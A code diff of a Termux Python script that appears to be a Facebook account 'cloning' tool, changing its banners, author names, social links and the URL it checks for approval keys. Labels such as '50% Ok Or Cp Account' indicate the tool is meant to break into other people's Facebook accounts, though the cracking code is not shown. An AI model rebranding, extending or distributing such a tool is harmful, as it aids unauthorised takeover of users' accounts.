@@ -41,23 +41,28 @@ def logo():
 def logo2():
 	#Yahan apna logo paste krna hw
 	print ("""
-	
-  ____  _                                   
- / ___|| |__   __ _ _   _  __ _ _ __   ___  
- \___ \| '_ \ / _` | | | |/ _` | '_ \ / _ \ 
-  ___) | | | | (_| | |_| | (_| | | | | (_) |
- |____/|_| |_|\__,_|\__, |\__,_|_| |_|\___/ 
-                    |___/                   
+
+  /$$$$$$  /$$                 /$$      
+ /$$__  $$| $$                | $$      
+| $$  \__/| $$$$$$$   /$$$$$$ | $$$$$$$ 
+|  $$$$$$ | $$__  $$ |____  $$| $$__  $$
+ \____  $$| $$  \ $$  /$$$$$$$| $$  \ $$
+ /$$  \ $$| $$  | $$ /$$__  $$| $$  | $$
+|  $$$$$$/| $$  | $$|  $$$$$$$| $$  | $$
+ \______/ |__/  |__/ \_______/|__/  |__/
+                                        
+                                        
+                                        
 
 
                50% Ok Or Cp Account Just Now Open🤟                                                                            
  ───────────────────────────────────────────────────────×
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m shayano Bar\x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m SHAYANOX3SULEMANO Jokar Bar\x1b[0m\x1b[1;97m]
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :6\x1b[0m\x1b[1;97m] \033[1;37m 
  ───────────────────────────────────────────────────────×
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr. shayano \x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr. SHAYANOX3SULEMANO \x1b[0m\x1b[1;97m]
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/SHAYANOX3SULEMANO75o \x1b[0m\x1b[1;97m]
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook Name : shah jehan. \x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook Name : SHAYANOX3SULEMANO Mr. \x1b[0m\x1b[1;97m]
 ───────────────────────────────────────────────────────× 
  """)
 
@@ -72,7 +77,7 @@ os.system('termux-setup-storage')
 def helpnote():
 	print("%s [=>] FOLLOW ME ON  FB TU KNOW ABOUT UPDATES  :)"%(G))
 	#yahan nichy httsp sy hata kr apna github aproval link dalna
-	subprocess.check_output(["am", "start", "https://raw.githubusercontent.com/Shoaibsafi2/shahg.py/main/ssk.txt/blob/main/ssk.txt"])
+	subprocess.check_output(["am", "start", "https://github.com/Shoaibsafi2/shahg.py/blob/main/ssk.txt/"])
 	#yahan apni facebook id link dalna
 	exit(" [=>] FACEBOOK :  https://www.facebook.com/Abal.Not.Allow.ok.Bro")
 
@@ -82,10 +87,10 @@ def notice():
  
 
 
-	runtxt("\n\033[0;97m  Free 2009 cloning Tool For Free Aproval Join Group ")
+	runtxt("\n\033[0;97m  Free 2009 cloning Tool For Free Aproval ki lya ib aw ")
 	os.system("xdg-open https://www.facebook.com/ShaYan007king")
-	runtxt("\033[0;97m Key Approval ke ib karo >> %s%s"%(G,basesplit))
-	runtxt("\033[0;97m Key ib karo")
+	runtxt("\033[0;97m Key Approval ke Lai Group Jion Krein >> %s%s"%(G,basesplit))
+	runtxt("\033[0;97m Key group admin ke liya ib aw")
 	os.system("xdg-open https://www.facebook.com/ShaYan007king")
 	subprocess.check_output(["am", "start", "https://www.facebook.com/ShaYan007king"])
 	
@@ -109,7 +114,7 @@ class Main:
 		self.loop = 0
 		try:
 			#yahan pr v apna github link dalna aproval wala
-			plr = requests.get('https://pastebin.com/raw/Q1HhBDQ3').text
+			plr = requests.get('https://github.com/Shoaibsafi2/shahg.py/blob/main/ssk.txt').text
 			if basesplit in plr:
 				key = basesplit
 				stat = ("\033[0;97mPREMIUM")
@@ -128,21 +133,26 @@ class Main:
 		os.system("clear")
 		#yahan logo lagana apna
 		print ("""
-                         
-  ____  _                                   
- / ___|| |__   __ _ _   _  __ _ _ __   ___  
- \___ \| '_ \ / _` | | | |/ _` | '_ \ / _ \ 
-  ___) | | | | (_| | |_| | (_| | | | | (_) |
- |____/|_| |_|\__,_|\__, |\__,_|_| |_|\___/ 
-                    |___/                   
+                        
+  /$$$$$$  /$$                 /$$      
+ /$$__  $$| $$                | $$      
+| $$  \__/| $$$$$$$   /$$$$$$ | $$$$$$$ 
+|  $$$$$$ | $$__  $$ |____  $$| $$__  $$
+ \____  $$| $$  \ $$  /$$$$$$$| $$  \ $$
+ /$$  \ $$| $$  | $$ /$$__  $$| $$  | $$
+|  $$$$$$/| $$  | $$|  $$$$$$$| $$  | $$
+ \______/ |__/  |__/ \_______/|__/  |__/
+                                        
+                                        
+                                        
 
  ───────────────────────────────────────────────────────×
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m SHAYANOX3SULEMANO Jokar Bar\x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m SHAYANOX3SULEMANO  Bar\x1b[0m\x1b[1;97m]
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 6\x1b[0m\x1b[1;97m] \033[1;37m 
  ───────────────────────────────────────────────────────×
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr. SHAYANOX3SULEMANO \x1b[0m\x1b[1;97m]
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/SHAYANOX3SULEMANO75o \x1b[0m\x1b[1;97m]
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook Page Name : SHAYANOX3SULEMANO Bar \x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook Page Name : SHAYANOX3SULEMANO  Bar \x1b[0m\x1b[1;97m]
 ───────────────────────────────────────────────────────× 
     """)
 		print("%s [%s•%s] %sTOOLS NAME : %s2009 Cloning Tools"%(G,R,G,B,G))
